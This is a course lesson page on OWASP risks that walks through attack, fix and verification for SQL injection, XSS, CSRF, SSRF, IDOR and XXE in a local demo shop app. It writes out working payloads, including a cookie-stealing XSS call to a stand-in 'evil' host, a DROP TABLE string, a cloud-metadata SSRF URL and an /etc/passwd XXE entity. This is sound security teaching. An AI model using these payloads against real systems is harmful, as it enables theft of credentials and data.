@@ -1,0 +1,140 @@
+---
+id: "22-1-1-owasp-risks-injection-and-xss-prevention"
+title: "22.1.1 OWASP Risks: Injection, XSS and Prevention"
+sidebar_label: "22.1.1 OWASP Risks: Injection, XSS and Prevention"
+slug: "/part-06-system-design-and-production-quality/22-security-testing-and-observability/22-1-application-security-engineering/22-1-1-owasp-risks-injection-and-xss-prevention"
+hide_title: true
+hide_table_of_contents: true
+---
+
+<BookNodePage nodeId="ch-22-s1-t1">
+
+Security work is not about fear; it is about knowing where the bodies are buried before the auditor, the attacker or the customer does. The OWASP Top 10 (2025 edition — released 2025-11-06 at Global AppSec DC) is the most direct map of where web applications actually fail. This lesson applies it to the ShopCore codebase you built: attack first, payload second, fix third, verification fourth — in that order, every time.
+
+The 2025 list, and where this lesson covers it: **A01** Broken Access Control (owns SSRF and IDOR/BOLA in 2025 — was its own category in 2021), **A02** Security Misconfiguration, **A03** Software Supply Chain Failures (→ 22-1-2), **A04** Cryptographic Failures, **A05** Injection (SQLi, XSS) (→ this lesson), **A06** Insecure Design, **A07** Authentication Failures (→ this lesson), **A08** Software or Data Integrity Failures (XXE, deserialization pointer), **A09** Security Logging & Alerting Failures (→ 22-3-1/22-3-2), **A10** Mishandling of Exceptional Conditions (fail-open anti-patterns — see 22.2.2's honest-quarantine and 21.4.2's degradation ladder). Source: [OWASP Top 10:2025](https://owasp.org/www-project-top-ten/).
+
+Work through this page against a **local ShopCore only** (`docker compose up` from [18.2.2](/book/part-05-deployment-cloud-and-devops/18-docker-and-containerized-application-deployment/18-2-volumes-networks-compose-and-registries/18-2-2-docker-compose-stacks-and-container-registries)). Never attack infrastructure you do not own.
+
+## 1. A05 Injection — SQL via the ORDER BY Parameter
+
+Express endpoints that sort product lists often take `?sort=` and interpolate it because `ORDER BY` cannot be a bind parameter:
+
+```js
+// VULNERABLE — do not ship
+const { rows } = await pg.query(
+  `SELECT id, name, price_cents FROM products ORDER BY ${req.query.sort} LIMIT 50`
+);
+```
+
+**Payload:** `?sort=(CASE WHEN (SELECT current_user = 'postgres') THEN price_cents ELSE name END)` — works equally as a blind oracle when results differ. Worst case with stacked queries via certain drivers: data exfiltration of the `customers` table.
+
+**Fix (whitelist, never interpolate):**
+
+```js
+const SORTS = { name: 'name ASC', price_asc: 'price_cents ASC', price_desc: 'price_cents DESC' };
+const order = SORTS[req.query.sort] ?? 'name ASC';
+const { rows } = await pg.query(
+  `SELECT id, name, price_cents FROM products ORDER BY ${order} LIMIT 50`
+); // `order` is server-controlled; user input never reaches the string
+```
+
+General rule: **bind parameters for values; whitelists for identifiers and operators.** `LIMIT $1`, `WHERE id = $1` — always. `pg`'s `$n` handles quoting; nothing else gets to build SQL strings.
+
+**Verify:** `curl "localhost:3000/api/products?sort=1;DROP TABLE products"` returns a normal list; error logs show zero raw input reaching the query; add a regression test asserting the malicious string maps to the default order.
+
+## 2. A05 Injection — XSS in Three Flavors
+
+**Stored (the dangerous one).** Attacker sets a product description to `<img src=x onerror="fetch('https://evil/steal?c='+document.cookie)">`. Every shopper who opens the product page executes it. React escapes by default — the hole is raw HTML sink:
+
+```jsx
+// VULNERABLE — bypasses React escaping
+<div dangerouslySetInnerHTML={{ __html: product.description }} />
+```
+
+**Fix:** render text as text (`{product.description}`); if rich text is truly required, sanitize server-side with `sanitize-html` (allowlist: `b, i, em, strong, ul, li, a[href]`) before storing, and never trust client sanitizers alone.
+
+**Reflected:** search page echoes `q` — `GET /search?q=<script>...`. Fix: escape on output (React does), never `innerHTML` the query.
+
+**DOM-based:** `el.innerHTML = location.hash.slice(1)`. Fix: `el.textContent`, or a sanitizer; hash/query strings are attacker-controlled input by definition.
+
+**Verification & headers:** `curl -I localhost:3000/products/sku-1` must show `Content-Security-Policy: default-src 'self'; img-src 'self' data:` — with CSP in report-only first, then enforced. Add `script-src 'self'`. CSP does not fix stored XSS; it contains its blast radius. Both are required.
+
+## 3. CSRF — Token + SameSite
+
+Attacker page auto-submits `<form action="https://shopcore.dev/api/orders" method="POST">` using the victim's cookies. ShopCore's defenses, layered:
+
+1. Session cookie: `HttpOnly; Secure; SameSite=Lax` (Lax blocks cross-site POST cookies; `Strict` breaks normal links — Lax is the right default).
+2. CSRF token for state-changing routes that rely on cookies: issued per session, compared on every non-GET via middleware (`csurf`-style double-submit or synchronizer token).
+3. Custom-header requirement (`X-Requested-With` or `Sec-Fetch-Site` checks) as cheap CSRF canary for API clients.
+
+**Verify:** replay the attack from `http://evil.local` — order must not be created; cookie without token → `403`.
+
+## 4. A01 / SSRF — Validating the Webhook URL
+
+ShopCore lets merchants register a fulfilment webhook URL. **Attack:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (cloud metadata) or `http://localhost:6379/` — the server, not the browser, fetches it.
+
+**Fix:** resolve the host, require `https` and a public IP against a denylist (all private ranges `10/8, 172.16/12, 192.168/16, 127/8, 169.254/16, ::1, fd00::/8`), re-check after DNS resolution (DNS rebinding), allowlist known provider domains where feasible, and fetch through an egress proxy with no route to metadata. Never follow redirects blindly — revalidate each hop.
+
+**Verify:** register `http://169.254.169.254/` → `400`; register a public URL → delivered; log contains resolved IP.
+
+## 5. A01 / IDOR & BOLA — Enumerate the Order Ids
+
+**Attack:** `GET /api/orders/1001`, `1002`, `1003`… — sequential ids leak every customer's order. This is Broken Object Level Authorization, the #1 API risk class in practice.
+
+**Fix (ownership check in every handler, one place):**
+
+```js
+// middleware: load order, then enforce ownership — not ad-hoc per route
+const order = await orders.findById(id);
+if (!order) return res.status(404).json(problem('not-found'));
+if (order.customer_id !== req.session.customerId && !req.session.roles.includes('support'))
+  return res.status(403).json(problem('forbidden'));
+```
+
+Support access goes through 21.2.3's materialized view with read-only role + audit log — not broader object access. Opaque ids (UUIDv4/ULIDs, e.g. `ord_01J9Z3…`) raise the noise floor but do NOT authorize anything; the check above is mandatory. **Verify:** authenticated customer A requests customer B's order → `403`; random UUIDs yield `404` without existence leakage (same body/timing).
+
+## 6. A07 Authentication Failures — Credential Stuffing and Friends
+
+- Credential stuffing against `/api/login`: rate limit by IP + account (e.g., 5 tries / 15 min, then lockout-ish backoff with CAPTCHA), alert on distributed failure patterns, enforce breached-password checks at reset time (k-anonymity APIs).
+- Session fixation: rotate the session id on privilege change (login/role grant) — never accept a pre-auth session id post-auth.
+- Password reset tokens: single-use, hashed at rest, 15-minute TTL, constant response for existing/non-existing emails.
+- JWTs (if used for API clients): `kid`-keyed rotation, short access TTL + refresh, algorithm pinned (reject `alg: none`).
+- See [13.3.1](/book/part-04-databases-backend-and-full-stack-development/13-backend-engineering-with-nodejs/13-3-authentication-and-authorization/13-3-1-sessions-jwts-and-password-hashing) for hashing baseline (argon2id/bcrypt) — never roll your own.
+
+**Verify:** 6 wrong passwords → `429`; reset replay → `400`; JWT with `alg: none` → `401`.
+
+## 7. A08 Pointer — XXE and Deserialization
+
+ShopCore is JSON-first, which eliminates most XXE. The exposure remains in: (a) any XML upload (ship via `libxml2` with `XML_PARSE_NOENT` disabled / external entities off), (b) document processing for invoices, (c) Node `eval`/`new Function` on any user input — banned; (d) `node-serialize`-style packages — never install. Pin deserialization of all structured input to `JSON.parse` + schema validation (`zod`). **Verify:** uploaded XML with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` parses with the entity inert.
+
+## 8. Fail-Open vs Fail-Closed (A10)
+
+Every control in this lesson must have a defined behavior when it errors: rate limiter down → **fail closed** on payment endpoints, fail open on catalog reads (documented, alarmed); CSRF service down → reject mutations; auth service down → 503, never "allow". "Mishandling of Exceptional Conditions" exists as a category because fail-open is a CVE with good intentions.
+
+## 9. Troubleshooting
+
+| Symptom | Cause | Fix |
+| :-- | :-- | :-- |
+| Products page renders `onerror=` as an attribute | Stored XSS reaching `dangerouslySetInnerHTML` | Remove sink; sanitize-on-store; add CSP report-only then enforce |
+| `ORDER BY` errors leak column names | Verbose DB errors in prod | Generic 500s; log details internally (22-3-1) with request id |
+| Support sees "order not found" for real orders | Ownership check applied to support role without bypass policy | Support path via `support_order_view` + role gate |
+| `npm run test:security` passes but curl shows XSS | Test asserted status, not content | Assert `Content-Security-Policy` header + no `<script>` in body |
+| Webhook registered to `http://10.0.0.5` | No egress validation | Section 4 denylist + egress proxy; audit existing hooks |
+
+## 10. Practice
+
+**Guided exercise.** In local ShopCore, exploit the ORDER BY and the stored-XSS sinks (with written authorization — it's your repo), then apply both fixes and write the two regression tests.
+
+**Independent exercise.** Deliver the full A01 pack: IDOR probe on three order ids as a normal customer, webhook SSRF to `169.254.169.254`, and a CSRF cross-site POST — capture before/after responses for each.
+
+**Challenge.** Write `docs/security/threat-model.md` for ShopCore checkout: assets (card tokens, PII, orders), entry points (SPA, API, webhooks, admin), top five abuse cases with P × I, and residual risk after Section 1–7 fixes.
+
+**Assessment checklist**
+
+- [ ] I can explain ORDER BY's parameterization limit and the whitelist fix.
+- [ ] I can demonstrate and then prevent all three XSS flavors with CSP containment.
+- [ ] I can name the three CSRF layers and why SameSite alone is not enough.
+- [ ] I can validate webhook URLs past DNS rebinding and redirect hops.
+- [ ] I know A01 (SSRF/BOLA folded in, 2025), A05 (Injection), A07 and A10 by number, not vibe.
+
+</BookNodePage>
